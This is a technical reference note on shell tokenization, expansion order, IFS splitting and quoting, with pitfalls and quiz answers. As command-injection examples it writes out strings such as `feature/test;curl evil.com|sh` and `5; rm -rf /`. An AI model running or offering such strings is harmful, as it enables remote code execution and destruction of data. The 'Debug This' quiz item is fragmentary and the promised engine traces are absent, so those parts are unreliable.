# Shell Parsing, Tokenization, and Expansion Order

> [!summary] Claim:
> A shell command line is not parsed in one monolithic pass; it undergoes lexical tokenization into words and operators, grammar reduction into an Abstract Syntax Tree, and a fixed five-phase word expansion order (Bash 5.3 names brace, tilde, parameter, command substitution, arithmetic, word splitting, filename expansion, and quote removal, plus process substitution).
> In Bash, brace expansion (an extension POSIX does not specify) runs strictly first as pure text generation, followed by a single left-to-right pass evaluating tilde, parameter, arithmetic, command substitution, and process substitution.
> Only the unquoted text resulting from those expansions undergoes field splitting via IFS and pathname expansion (globbing), after which syntactic quotes are permanently stripped during quote removal.
> Quotes introduced by variable substitution are never removed by quote removal, creating an unbridgeable semantic boundary between code and data.

## The Mechanism

The POSIX shell language and GNU Bash operate under a strict division between syntactic parsing and runtime word expansion.
Understanding this division is essential to avoiding critical bugs in production automation, command-line toolchain wrappers, and security-hardened agent interfaces.
Every standard fact below is derived from IEEE Std 1003.1-2024 (POSIX.1-2024) Chapter 2 and GNU Bash version 5.3 source code unless explicitly cited otherwise.

### 1. Lexical Tokenization and Ordinary Token Recognition

The shell reads input as characters and converts them into tokens: words and operators.
This process is governed by POSIX.1-2024 Section 2.3 (Token Recognition).
The lexical analyzer operates as a state machine processing characters from left to right according to ten normative rules:

1. **End of Input:** If end of input is recognized, the current token is delimited; if no token is being formed, EOF is returned.
2. **Operator Continuation:** If the previous character was part of an operator, and the current character can combine to form a valid multi-character operator, it is appended.
   This enforces the **Munch Rule** (maximal munch / longest match), ensuring that `>>` is recognized as a redirection operator rather than two sequential `>` operators, and `&&` is recognized as a logical control operator rather than two background operators.
3. **Operator Delimitation:** If the previous character was part of an operator and the current character cannot combine with it, the current operator token is delimited.
4. **Quoting Handlers:** If the current character is an unquoted backslash `\`, single-quote `'`, double-quote `"`, or dollar-single-quote `$'`:
   - An unquoted backslash preserves the literal value of the following character (except newline, which triggers line continuation by removing both the backslash and the newline).
   - Single-quotes `'...'` preserve the literal value of every enclosed character without exception; a single-quote can never appear between single-quotes.
   - Double-quotes `"..."` preserve the literal value of characters except `$`, `` ` ``, and `\` (POSIX.1-2024 Section 2.2.3); interactive Bash additionally treats `!` as history expansion, which is not POSIX.
   - Dollar-single-quotes `$'...'` (standardized in POSIX.1-2024 Section 2.2.4) decode C-style escape sequences; POSIX says the escapes are processed immediately prior to word expansion of the word, not during token recognition.
   During token recognition, quotes do not delimit tokens and no substitutions are performed; the token keeps every quoting character exactly as it appeared in the input (POSIX.1-2024 Section 2.3, rule 4).
5. **Expansions:** If an unquoted `$`, `` ` ``, or `${` is encountered, the shell reads ahead to find the matching closing delimiter (such as `)` or `}`), parsing nested quoting and structures recursively to determine the token boundary.
6. **Operator Initiation:** If an unquoted character can start a new operator (such as `;`, `&`, `|`, `(`, `)`, `<`, `>`), the current token is delimited, and the new operator begins.
7. **Blank Delimitation:** If an unquoted blank (space or tab) is encountered, the current token is delimited and discarded.
8. **Word Accumulation:** If the previous character was part of a word, the current character is appended to that word.
9. **Comments:** If an unquoted `#` appears at a position where a token could start, it and all subsequent characters up to the next newline are discarded as a comment.
10. **Word Initiation:** Any other character starts a new word token.

### 2. Contextual Token Disambiguation and Alias Substitution

Once tokens are recognized, the parser determines their semantic role based on position and syntax state:

- **Reserved Words:** Tokens such as `if`, `then`, `else`, `fi`, `for`, `while`, `do`, `done`, `case`, `esac`, `{`, `}`, and `!` are recognized only when unquoted and occurring as the first word of a command, following a pipeline operator, or following specific reserved words.
  Quoting any character (for example, `\if` or `"then"`) forces the parser to treat the token as a standard command name or word argument.
- **Assignment Words:** A token containing an unquoted equals sign `=` where the preceding substring is a valid C-style identifier (`[a-zA-Z_][a-zA-Z0-9_]*`) is classified as an assignment word.
  Assignment words preceding a command name are placed in the execution environment of that specific command; standalone assignment words mutate the shell environment.
- **Alias Substitution:** Defined in POSIX.1-2024 Section 2.3.1.
  When a token is read that could be a command name (the first word of a simple command), the shell checks its internal alias table.
  If a match is found:
  1. The alias value replaces the token in the input stream.
  2. Token recognition restarts on the replacement string.
  3. To prevent infinite recursion, an alias is suppressed from self-substitution while expanding its own definition.
  4. **The Trailing Blank Rule:** If the value of an expanded alias ends with a blank character (space or tab), the shell inspects the *next* token immediately following the alias for alias substitution as well.
     This allows idioms like `alias sudo="sudo "` to extend alias expansion to the command arguments passed to `sudo`.
  Alias substitution occurs strictly during lexical input processing, which explains why defining an alias inside a compound command `( alias foo=bar; foo )` fails in Bash: Bash reads all lines of a compound command before executing any of it, so the alias takes effect only after the whole compound command (GNU Bash Reference Manual Section 6.6 Aliases).
  POSIX.1-2024 Section 2.3.1 only guarantees that an alias change takes effect no later than the completion of the currently executing `complete_command`.

### 3. Shell Grammar Parsing and AST Generation

The token stream feeds an LALR(1) parser generated from the yacc grammar in Bash's `parse.y`.
The bash-5.3 release tarball ships the generated `y.tab.c`, whose first line reads `A Bison parser, made by GNU Bison 3.8.2`, and Bison builds LALR(1) tables by default (checked 2026-11 against the bash-5.3 tarball and the Bison manual).
The parser validates grammatical grammar rules:
- `simple_command`: A sequence of variable assignments, redirections, and words forming a command invocation.
- `pipeline`: One or more commands connected by `|` or `|&`.
- `command`: Simple commands, compound commands (`{ list; }`, `( list )`, `for`, `while`, `if`, `case`), and function definitions.
- `list`: Sequences of pipelines joined by `;`, `&`, `&&`, or `||`.

In Bash's internal C structures (`command.h`), each parsed word is represented as a `WORD_DESC`:

```c
typedef struct word_desc {
    char *word;      /* NUL-terminated token string */
    int flags;       /* Attribute flags: W_HASQUOTEDNULL, W_ASSIGNMENT, W_NOSPLIT, etc. */
} WORD_DESC;

typedef struct word_list {
    struct word_list *next;
    WORD_DESC *word;
} WORD_LIST;
```

The parsed commands are assembled into command trees rooted at `COMMAND` nodes, ready for execution.
Full pipeline execution, fork-exec dispatch, and file descriptor manipulation are handed off to [[Pipelines-Subshells-Redirection-and-Process-Substitution]].

### 4. The Five-Phase Word Expansion Sequence

When a simple command is prepared for execution, each word in its argument list is expanded by Bash's `subst.c` (`expand_words()` and `expand_word_list_internal()`).
The expansion follows a fixed order of five phases; the Bash 5.3 manual (Section 3.5) lists eight expansions, the last being quote removal, plus process substitution performed at the same time as tilde, parameter, arithmetic, and command substitution:

```text
[Word] -> [Stage 1: Brace] -> [Stage 2: Tilde, Param, Arith, CmdSub, ProcSub] -> [Stage 3: Field Split] -> [Stage 4: Glob] -> [Stage 5: Quote Removal] -> [argv]
```

#### Stage 1: Brace Expansion

Brace expansion is implemented in `braces.c` (`brace_expand()`).
It is a non-POSIX extension originated by the C shell (`csh`); Bash's build option calls it "csh-like brace expansion", and Zsh and ksh93 also provide it: `echo {a,b}c` prints `ac bc` in Zsh 5.9.2 and in ksh93u+ 2012-08-01 (`/bin/ksh` on macOS), checked 2026-11 on macOS.
Both of those shells also print `1 2 3` for `N=3; echo {1..$N}`, so the "`$N` stays literal" behavior below is specific to Bash.
Brace expansion is purely textual and operates **before any other expansion**.
It parses patterns matching `{string1,string2,...}` or sequences `{x..y[..incr]}`:

- Because it runs before parameter expansion, variable references inside braces are not evaluated.
  The expression `{1..$N}` sees literal `$N`.
  Because `$N` is not an ASCII digit, the sequence generator fails to parse numeric endpoints and returns `{1..$N}` unchanged.
- Brace expansion multiplies words combinatorially: `a{b,c}{d,e}` produces four words: `abd`, `abe`, `acd`, `ace`.
- Syntactic quotes enclose braces and suppress brace expansion: `"{a,b}"` yields the single argument `{a,b}` after quote removal (checked locally in Bash 5.3.15).

#### Stage 2: Tilde, Parameter, Arithmetic, Command, and Process Substitution

This phase scans the word from left to right in a single pass.
Because all expansions in this stage share a single scan pass, their interactions are strictly deterministic:

- **Tilde Expansion:** An unquoted leading `~` at the start of a word (or, in an assignment, after a `:` or the first `=`) is checked against the user database.
  `~` expands to `$HOME`; `~+` to `$PWD` and `~-` to `$OLDPWD` are Bash extensions.
- **Parameter and Variable Expansion:** `${VAR}`, `${VAR:-default}`, `${#VAR}`, and parameter substring substitutions are evaluated.
- **Arithmetic Expansion:** `$(( expression ))` evaluates integer arithmetic via C-style operators; POSIX requires only signed long arithmetic, and Bash uses the largest fixed-width integer available (64-bit on mainstream platforms) with no overflow check.
- **Command Substitution:** `$(command)` or `` `command` `` executes the command in a subshell environment and replaces the token with its standard output.
  POSIX.1-2024 Section 2.6.3 requires that **any sequence of one or more newline characters at the end of the substitution output must be deleted**.
  Intermediate newlines are preserved.
- **Process Substitution:** `<(command)` and `>(command)` connect a subshell to a pipe or `/dev/fd/N` file descriptor, returning the path string.
  The Bash manual states process substitution is performed at the same time as tilde, parameter, arithmetic expansion, and command substitution, in the same left-to-right pass.

Crucially, the shell must remember which characters came from expansions and which were quoted in the original word.
In Bash's `expand_word_internal()` the syntactic quotes are consumed during this scan, and each quoted character is prefixed with the internal `CTLESC` marker (quoted null strings become `CTLNUL`); unquoted expansion output carries no marker, which is what later makes it eligible for field splitting and globbing.

#### Stage 3: Field Splitting (Word Splitting via IFS)

Field splitting (POSIX.1-2024 Section 2.6.5) is implemented in `subst.c` (`word_split()`).
It is applied **only to the results of unquoted expansions from Stage 2**.
Literal parts of the command line and characters protected by single or double quotes are completely immune to field splitting.

The behavior is dictated by the Internal Field Separator variable `$IFS`:
1. **Unset IFS:** If `$IFS` is unset, the shell defaults to space, tab, and newline: `IFS=$' \t\n'`.
2. **Null IFS:** If `IFS=""` (set to the empty string), field splitting is completely disabled; expanded strings remain intact as a single token.
3. **IFS Whitespace:** Characters in `$IFS` that are space, tab, or newline are classified as IFS whitespace.
   - Any IFS whitespace at the beginning or end of expanded text is completely ignored and stripped.
   - Any run of one or more adjacent IFS whitespace characters acts as a single field delimiter.
4. **IFS Non-Whitespace:** Characters in `$IFS` that are not whitespace (such as `:` in `IFS=":"`):
   - Each occurrence of an IFS non-whitespace character acts as a field delimiter.
   - Adjacent IFS non-whitespace characters (such as `::`) delimit an **empty field** (`""`).
   - If an IFS non-whitespace character is preceded or followed by IFS whitespace, the whitespace is consumed, but the non-whitespace character remains a single delimiter.
   - A leading IFS non-whitespace character produces a leading empty field, but a trailing one does not produce a trailing empty field: with `IFS=:`, `:a` gives two fields and `a:b:` gives two fields (POSIX.1-2024 Section 2.6.5 algorithm; checked locally in Bash 5.3.15 and 3.2.57).

#### Stage 4: Pathname Expansion (Filename Generation / Globbing)

Pathname expansion (POSIX.1-2024 Section 2.6.6) scans each field produced by field splitting for the unquoted pattern characters `*`, `?`, and `[...]`.
If `set -f` (`set -o noglob`) is active, this stage is bypassed.
- Each matching pattern is replaced by the list of matching filesystem paths, sorted according to the collating sequence of the current locale (POSIX.1-2024 Section 2.14.3), which is why the lab pins `LC_ALL=C`.
- If no matching files are found, POSIX defaults to leaving the pattern token unchanged.
  In Bash, setting `shopt -s nullglob` removes the token entirely if no match is found, while `shopt -s failglob` aborts command execution with an error.
- Filenames containing spaces that match a glob pattern are returned as discrete argument tokens; **they are not subjected to retroactive field splitting**, because Stage 3 has already completed.

#### Stage 5: Quote Removal

Quote removal (POSIX.1-2024 Section 2.6.7) is implemented in `subst.c`: `expand_word_list_internal()` calls `glob_expand_word_list()`, which dequotes words as it globs, or `dequote_list()` (a loop over `dequote_string()`) when globbing is disabled.
POSIX defines the step as deleting the `$'` sequence and the unquoted backslashes `\`, single-quotes `'`, and double-quotes `"` that were present in the **original word**.

**The Quote Removal Invariant:**
Quotes that were produced by variable expansion or command substitution are never removed by Stage 5 (POSIX.1-2024 Section 2.6.7; Bash Reference Manual Section 3.5).
If a variable contains the string `'"foo bar"'`, expanding `$var` produces tokens containing literal quote characters.
In Bash, quote removal ignores them because the syntactic quotes were already consumed during the Stage 2 scan and `dequote_string()` only strips the internal `CTLESC` and `CTLNUL` markers; a literal `"` byte from a variable is plain data with no marker.
This mechanical invariant guarantees that user data can never inject syntactic command structures unless explicitly forced through `eval`.

### 5. Quoting Semantics and POSIX.1-2024 Standardizations

The interaction between quoting rules and expansion stages is summarized in the quoting hierarchy:

| Quoting Syntax | Preserves Literal Text | Parameter / CmdSub Expansion | Field Splitting on Result | Pathname Expansion on Result | Backslash Escaping |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `none` (unquoted) | No | Yes | Yes (via `$IFS`) | Yes | Yes |
| `'...'` (single) | Yes (absolute) | No | No | No | No (literal backslash) |
| `"..."` (double) | Selective | Yes | No | No | Only before `$`, `` ` ``, `"`, `\`, `\n` |
| `$'...'` (ANSI C) | Decodes escapes | No | No | No | Full C escape sequence table |

#### POSIX.1-2024 Dollar-Single Quoting (`$'...'`)

POSIX.1-2024 Section 2.2.4 standardized dollar-single-quote notation across all POSIX systems.
The escape sequences POSIX requires, processed immediately prior to word expansion, are:
- `\a` (alert/bell), `\b` (backspace), `\e` (escape), `\f` (form-feed), `\n` (newline), `\r` (carriage return), `\t` (horizontal tab), `\v` (vertical tab)
- `\\` (backslash), `\'` (single quote), `\"` (double quote)
- `\ddd`: 1 to 3 octal digits representing a byte
- `\xXX`: one or more hexadecimal digits; more than two is unspecified
- `\cX`: Control-X character mapping
Bash 5.3 adds, as extensions: `\E` (escape), `\?` (question mark), `\uHHHH` (one to four hex digits) and `\UHHHHHHHH` (one to eight hex digits) for a Unicode code point, and limits `\xHH` to one or two hex digits (GNU Bash Reference Manual Section 3.1.2.4).
Bash 3.2, the `/bin/bash` shipped on macOS, does not decode `\u`.

#### The Localization Hazard (`$"..."`)

In Bash, `$"string"` triggers locale-based translation via `gettext`.
The translated string replaces the original and remains double-quoted by default, so a translation catalog containing `$(...)` or backticks still has those expansions performed: whoever controls the message catalog can inject commands.
Bash 5.2 added `shopt -s noexpand_translation`, which makes translated strings single-quoted instead (GNU Bash Reference Manual Section 3.1.2.5, as of 2026-11).

## Multi-Language Comparison

Process invocation interfaces across systems languages compare directly against shell expansion behaviors:

| Operational Dimension | Shell (Bash / POSIX sh) | C++ (`<spawn.h>` / `execve`) | Python (`subprocess`) | Rust (`std::process::Command`) |
| :--- | :--- | :--- | :--- | :--- |
| Argument Array Passing | String parsed through 5 expansion stages into `argv` | Caller explicitly builds `char *const argv[]` | `list[str]` passed directly to kernel `execve` | `.arg()` / `.args()` appends string slice directly |
| Word Splitting Behavior | Automatic on unquoted expansions via `$IFS` | None; array boundaries are programmer-defined | None when `shell=False`; full splitting if `shell=True` | None; each `.arg()` is an exact argument boundary |
| Pathname Expansion (Glob) | Automatic in Stage 4 unless `set -f` | None; requires manual `glob(3)` invocation | None when `shell=False`; requires `glob.glob()` | None; requires external `glob` crate |
| Shell Injection Surface | High: unquoted variables trigger splitting & globs | Zero via `posix_spawnp`; high if passing to `system()` | Zero with default `shell=False`; severe if `shell=True` | Zero; `Command::new` bypasses shell entirely |
| Tokenization Emulation | Native lexer (`parse.y`) | None standard; manual tokenizers | `shlex.split()` (lexing & quotes, no expansions) | `shlex` crate (POSIX token parsing) |

### Reference Engine Stage Trace

The C99 reference engine (`expansion_engine.c`) runs nine traces.

Stage 3 follows the POSIX.1-2024 Section 2.6.5 IFS algorithm, and Stage 4 calls `glob(3)` in a directory where `run.sh` has created `data_a.tmp` and `data_b.tmp`.

## Pitfalls

> [!warning] Pitfall: Unquoted variable expansion ($VAR instead of "$VAR")
> Unquoted variable expansion triggers Stage 3 Field Splitting and Stage 4 Pathname Expansion on the expanded text.
> If a variable contains spaces (e.g. `path="/Volumes/My External Disk"`), executing `ls $path` causes the shell to split it into three arguments: `/Volumes/My`, `External`, and `Disk`.
> If a variable contains an asterisk (e.g. `formula="3 * 5"`), executing `echo $formula` expands the asterisk against every file in the current working directory.
> Always enclose parameter expansions in double quotes `"$VAR"` unless explicit field splitting or globbing is required.

> [!warning] Pitfall: Using eval to force dynamic brace expansion
> Because brace expansion precedes parameter expansion, writing `{1..$N}` produces literal `{1..5}` instead of expanding the sequence.
> Engineers frequently resort to `eval echo {1..$N}` to force a second parsing pass.
> `eval` re-runs the entire lexical analysis, parsing, and expansion sequence from scratch on the concatenated string.
> If `$N` contains malicious shell metacharacters (e.g. `5; rm -rf /`), `eval` executes them with full shell privileges.
> Use Bash arithmetic loops `for ((i=1; i<=N; i++))` (not POSIX), a POSIX `while [ "$i" -le "$N" ]` loop, or the external sequence tool `seq 1 "$N"` instead of `eval`.

> [!warning] Pitfall: Leaking global IFS modifications
> Changing `$IFS` globally (e.g. `IFS=":"` to parse `/etc/passwd`) alters field splitting across every subsequent unquoted expansion in the shell process.
> If a script later executes standard commands or functions without restoring `$IFS`, all default whitespace splitting fails.
> Confine `$IFS` modifications to subshells `( IFS=":"; count_args $data )`, read builtins `IFS=":" read -r user pass uid gid rest`, or save and restore `OLD_IFS="$IFS"; IFS=":"; ...; IFS="$OLD_IFS"`.

> [!warning] Pitfall: Storing complex commands in strings
> Storing a command with arguments in a string (e.g. `CMD="curl -H 'Authorization: Bearer token' https://api"`) fails when executed as `$CMD`.
> In Stage 2, `$CMD` expands to the string.
> In Stage 3, field splitting divides the string on whitespace, producing `'Authorization:` and `token'` as separate fields.
> In Stage 5, quote removal refuses to strip the single quotes because they were produced by parameter expansion, not syntactic tokens.
> The remote server receives literal single quotes in the HTTP header, failing authentication.
> Use Bash arrays `CMD=(curl -H "Authorization: Bearer token" "https://api")` and execute `"${CMD[@]}"` to preserve exact argument boundaries without secondary parsing.

> [!warning] Pitfall: Trailing newline deletion in command substitution
> The POSIX specification explicitly mandates that command substitution `$(cmd)` strips all trailing newlines from command output.
> If a command outputs binary data, a cryptographic hash, or text where trailing newlines are significant, `$(cmd)` silently corrupts the payload.
> Prevent truncation using the guard character idiom: `data=$(cmd; printf "x"); data="${data%x}"`.
> The trailing `x` prevents the shell from seeing a newline at the end of output, and parameter expansion strips the guard byte cleanly.

> [!warning] Pitfall: Non-whitespace IFS adjacent delimiters creating unexpected empty fields
> While IFS whitespace collapses runs of spaces into a single delimiter, IFS non-whitespace treats every single character as an independent delimiter.
> Given `IFS=":"` and `str="a::b"`, splitting `$str` yields three fields: `a`, `""` (empty string), and `b`.
> If an automated pipeline expects two fields, the hidden empty field shifts all subsequent positional parameters.
> When parsing tabular data with irregular delimiters, verify whether fields can be empty or sanitize delimiters with `awk` before shell ingestion.

> [!warning] Pitfall: Defining aliases inside compound commands or scripts
> In Bash, aliases are expanded when commands are read, during lexical analysis before syntax trees are parsed.
> In non-interactive scripts, alias expansion is disabled by default (`shopt -u expand_aliases`), except in POSIX mode, where it is always enabled.
> Even when enabled with `shopt -s expand_aliases`, defining an alias inside an `if` block, function, or subshell and calling it in the same block fails: the entire block was tokenized before the alias definition executed.
> Use shell functions instead of aliases for programmatic encapsulation.

## At Scale

In enterprise environments spanning 1,000 to 50,000 engineers, shell script defects originating from parsing, quoting, and expansion hazards are a primary cause of CI/CD pipeline breakage, deployment outages, and security vulnerabilities.

### Fleet Failure Modes

1. **Remote Code Execution via CWE-78 (OS Command Injection):**
   When build scripts concatenate user-supplied input (such as git branch names, pull request titles, or environment variables) into unquoted command invocations or `eval` strings, attackers can inject arbitrary subshells via `;`, `&`, or `$(...)`.
   A branch named `feature/test;curl evil.com|sh` executed inside `git checkout $BRANCH` triggers arbitrary remote execution.
2. **Silent Argument Drift and File Deletion:**
   Scripts running `rm -rf $BUILD_DIR/*` in automated cleanup jobs cause catastrophic data loss if `BUILD_DIR` is empty or unset.
   Unquoted `$BUILD_DIR` expands to nothing, reducing the command to `rm -rf /*`.
   Enforcing `set -u` (`set -o nounset`) aborts execution immediately on unset variables.
3. **Glob Expansion Exhaustion (`E2BIG`):**
   In large monorepos with hundreds of thousands of files, unquoted glob expressions like `process_files *.json` exceed the Linux kernel argument limit: argv plus envp may total 1/4 of the soft `RLIMIT_STACK` (2 MiB with the common 8 MiB stack), capped at 6 MiB (3/4 of `_STK_LIM`), and each string at 32 pages (`MAX_ARG_STRLEN`) (execve(2), Linux, as of 2026-11).
   The `execve(2)` system call fails with `Argument list too long` (error code `E2BIG`).
   Production tooling must stream filenames through NUL-delimited pipelines using `find -print0` and `xargs -0` as detailed in [[File-Discovery-and-Batch-Execution-Find-Fd-Xargs-Parallel]].

### Organizational Decision Rules

To govern shell usage across engineering fleets:

- **Rule 1: Mandate ShellCheck in Pre-Commit and CI:**
  Enforce static analysis via `shellcheck` across all repositories.
  Configure CI gates to reject scripts triggering SC2086 (Double quote to prevent globbing and word splitting), SC2068 (Double quote array expansions), and SC2128 (Expanding array without index).
  Integrate with team standards documented in [[Robust-Shell-Scripting-and-ShellCheck]].
- **Rule 2: Restrict Shell Scripts by Size and Complexity:**
  Adopt a binding Architectural Decision Record ([[Command-Line-Decision-Records]]): any automation script exceeding 100 lines of code, requiring complex data structures (associative arrays, nested lists), or performing network I/O must be written in a compiled or strongly-typed language (such as Rust, Go, or Python).
- **Rule 3: Enforce Strict Mode and Safe Defaults:**
  All production scripts must begin with `set -euo pipefail` to ensure fail-fast behavior on non-zero exit codes, unset variables, and pipeline failures.
- **Rule 4: Design Machine-Readable Agent Interfaces (AXI):**
  When building developer toolchains intended for autonomous AI agents, ensure that commands adhere to deterministic Agent eXperience Interface (AXI) standards.
  Bypass shell expansion ambiguities by accepting explicit flags and structured input formats rather than loose positional arguments, as formalized in [[CLI-Design-and-Agent-Friendly-Interfaces-AXI]].

> [!question] L5: Why does `echo {1..$N}` fail to expand a numeric sequence in Bash, and why is `eval echo {1..$N}` considered dangerous in production?
>
> > [!success]- Answer
> > Brace expansion is the very first stage (Stage 1) in the expansion sequence, running strictly before Stage 2 Parameter Expansion.
> > When `{1..$N}` is processed by `braces.c`, the variable `$N` has not yet been expanded; the shell sees the literal ASCII string `$N`.
> > Because `$N` is not an integer constant, the range parser aborts expansion and preserves `{1..$N}` verbatim.
> > Subsequently, Stage 2 expands `$N` to its value (say, `5`), resulting in the string `{1..5}`.
> > Using `eval echo {1..$N}` works because `eval` concatenates its arguments into a single string and passes it back to the beginning of the lexical analyzer and parser, running a completely new parsing pass where `{1..5}` is now an integer literal.
> > It is dangerous because `eval` interprets all metacharacters in the string.
> > If `$N` contains untrusted input like `5; curl evil.com | sh`, `eval` executes the injected commands with the full privileges of the shell process.
> > Production scripts should use arithmetic C-style loops `for ((i=1; i<=N; i++))` or external sequence utilities `seq 1 "$N"`.

> [!question] L6 (Debug This): A developer wrote the following deployment function to execute container commands.

> > `argv[0] = "docker"`
> > `argv[1] = "run"`

> [!question] L6: Contrast the field-splitting semantics of IFS whitespace characters versus IFS non-whitespace characters under POSIX.1-2024.
>
> > [!success]- Answer
> > Under POSIX.1-2024 Section 2.6.5, `$IFS` characters are strictly divided into IFS whitespace (space, tab, newline) and IFS non-whitespace (any other character in `$IFS`, such as `:`, `,`, or `;`):
> > 1. **Whitespace Trimming:** IFS whitespace is automatically ignored and trimmed at the beginning and end of expanded text.
> >    IFS non-whitespace is not trimmed: a leading non-whitespace delimiter creates a leading empty field (`""`), but a trailing one only terminates the last field and creates no trailing empty field (with `IFS=:`, `a:b:` yields two fields).
> > 2. **Delimiter Collapsing:** A sequence of one or more adjacent IFS whitespace characters is treated as a single delimiter.
> >    In contrast, each individual occurrence of an IFS non-whitespace character acts as a separate delimiter.
> >    Adjacent non-whitespace characters (such as `::` in `a::b`) delimit an empty field between them, producing three fields: `a`, `""`, `b`.
> > 3. **Mixed Combinations:** When IFS whitespace is adjacent to an IFS non-whitespace character (e.g. `IFS=" :"` parsing `" a : : b "`), the whitespace surrounding the non-whitespace delimiter is consumed and discarded, but each non-whitespace character still creates an independent boundary.

> [!question] L6: How does command substitution handle trailing newlines, and what exact idiom captures command output with byte-level fidelity?
>
> > [!success]- Answer
> > POSIX.1-2024 Section 2.6.3 explicitly specifies that the shell must remove all trailing newline characters from the output of a command substitution `$(command)`.
> > Intermediate newlines are preserved.
> >
> > However, if `command` outputs binary data or formatted text where trailing newlines are semantically significant, `$(command)` silently strips them.
> > To preserve all trailing newlines with byte-level fidelity without spawning external subprocesses, append a non-newline guard character inside the subshell and strip it via parameter expansion:
> > ```bash
> > OUTPUT=$(command; printf "x")
> > OUTPUT="${OUTPUT%x}"
> > ```
> > Because `command` output is followed immediately by `x`, there are no trailing newlines at the end of the substitution buffer, so zero newlines are stripped.
> > The `${OUTPUT%x}` parameter expansion strips the trailing `x` in memory without another process, at the cost of copying the O(n) string.
> > Command substitution also drops NUL bytes (Bash warns `ignored null byte in input`), so the idiom preserves newlines, not arbitrary binary data.

> [!question] L7: Walk through the POSIX.1-2024 token recognition state machine and explain the "Munch Rule" (longest match operator) and alias substitution trailing blank chaining rule.
>
> > [!success]- Answer
> > POSIX.1-2024 Section 2.3 defines token recognition as a character-by-character scan using ten prioritized rules.
> >
> > **The Munch Rule (Longest Match):**
> > When reading input outside quotes, Rule 2 dictates that if the previous character formed part of an operator and the current character can combine with it to form a valid operator, it is appended.
> > The tokenizer greedily matches the longest operator token possible:
> > - Given `>>`, it produces a single append redirection token `>>`, never two successive `>` tokens.
> > - Given `;&` (in `case` statements), it produces a single fall-through operator `;&`, the `SEMI_AND` token that POSIX.1-2024 Section 2.10.2 added to the grammar.
> > - Given `&&`, it produces a logical AND operator rather than two background asynchronous operators.
> > Only when the current character cannot continue the operator does Rule 3 delimit the operator token.
> >
> > **Alias Substitution Trailing Blank Chaining (Section 2.3.1):**
> > When a token in a command position matches an alias name, the alias value replaces the token in the input stream and token recognition restarts.
> > If the replacement text ends with a blank character (space or tab), POSIX specifies that the next token immediately following the alias is also checked for alias substitution.
> > For example, if `alias sudo="sudo "` and `alias ll="ls -l"`, executing `sudo ll /var` causes `sudo` to expand to `sudo `.
> > Because it ends in a space, the shell inspects the following token `ll`, expanding it to `ls -l`.
> > This chaining enables wrapper aliases to maintain alias expansion across arguments.

> [!question] L7: In GNU Bash source code (`subst.c`), why does quote removal (`dequote_list()`) not strip quote characters that were produced by parameter expansion, and what internal data structures track this origin?
>
> > [!success]- Answer
> > In Bash's internal implementation (`command.h` and `subst.c`), parsed words are stored in `WORD_DESC` structures.
> > During lexical parsing, characters that appear inside quotes or are escaped are tagged.
> > When parameter expansion occurs in `expand_word_internal()`, text retrieved from variables is copied into the expanding token buffer.
> >
> > In `subst.c`, the provenance is carried in-band, as marker bytes inside the word string, plus `WORD_DESC.flags`:
> > - While `expand_word_internal()` scans the word, it consumes the original syntactic quote characters (`'` and `"`) and prefixes each character they protected with the `CTLESC` marker (an empty quoted string becomes `CTLNUL`); word-level `flags` such as `W_QUOTED` and `W_HASQUOTEDNULL` record that quoting occurred.
> > - Text produced by an unquoted parameter expansion is copied in without markers (only literal `CTLESC` or `CTLNUL` bytes in the value get escaped), which is exactly what makes it eligible for `word_split()` and globbing.
> > When the pipeline reaches Stage 5, `dequote_string()` (called through `dequote_list()` or during `glob_expand_word_list()`) strips only the `CTLESC` and `CTLNUL` markers.
> > If a variable contains literal quote characters (e.g. `VAR='"data"'`), those quotes are plain text bytes with no marker.
> > Therefore, quote removal leaves them untouched.
> > This architectural separation between lexical AST construction and runtime string interpolation ensures that user data can never cross into the syntactic domain.

> [!question] L8+: Design a secure command evaluation architecture for a high-throughput developer platform or autonomous AI agent harness that must safely execute arbitrary user-parameterized build commands without exposing the host to command injection (CWE-78) or word splitting hazards.
>
> > [!success]- Answer
> > An enterprise developer platform or autonomous AI agent harness must never pass unsanitized command strings to `/bin/sh -c` or `system()`.
> > The architecture must enforce a five-layer security model:
> >
> > 1. **Structured Invocation Boundary (No Shell Intermediate):**
> >    Prohibit passing monolithic command strings.
> >    The execution engine must accept structured JSON payloads specifying an executable path and an explicit argument list:
> >    ```json
> >    {
> >      "executable": "/usr/bin/git",
> >      "args": ["commit", "-m", "User commit message with spaces and ; rm -rf"]
> >    }
> >    ```
> >    The runner invokes the operating system kernel directly via `execve(2)` or `posix_spawn(3)` (in Rust: `std::process::Command::new()`; in Python: `subprocess.run(shell=False)`).
> >    By passing arguments as discrete memory pointers in the `argv` array, the shell parser is completely bypassed, making shell injection impossible; argument injection (a user value beginning with `-` that the target parses as an option) remains and needs `--` or validation.
> >
> > 2. **Lexical Analysis for Legacy Shell Inputs:**
> >    If user input must be accepted as a CLI string (e.g. from an interactive prompt), tokenize the input using a dedicated POSIX-compliant AST lexer (such as the Rust `shlex` crate or a custom state machine based on POSIX 2.3).
> >    Reject any input containing control operators (`;`, `&`, `|`, `&&`, `||`, newline) or expansion sequences (`$`, `` ` ``) unless explicitly sandboxed.
> >
> > 3. **Hermetic Environment Isolation:**
> >    Never inherit the parent host environment.
> >    Construct a sterile environment block containing only explicitly allowlisted variables:
> >    - Sanitize `PATH` to trusted directories (`/usr/bin:/bin`).
> >    - Reset `IFS` to default or unset.
> >    - Set `LC_ALL=C.UTF-8` for deterministic collation.
> >
> > 4. **Process Sandboxing and Privilege Separation:**
> >    Execute commands within isolated Linux namespaces (user, mount, PID, network) or lightweight containers.
> >    Drop all Linux capabilities (`CAP_SYS_ADMIN`, `CAP_NET_ADMIN`).
> >    Enforce seccomp filters blocking dangerous system calls (`ptrace`, `bpf`, `mount`).
> >    Apply strict cgroup limits on memory, CPU, and maximum PID allocation to prevent fork bombs.
> >
> > 5. **Deterministic I/O Streaming with Guarded Line Buffering:**
> >    Capture standard output and standard error via non-blocking pipes, avoiding shell command substitution truncation hazards.
> >    Impose strict output size limits (e.g. 50 MiB) to prevent memory exhaustion from runaway process output.
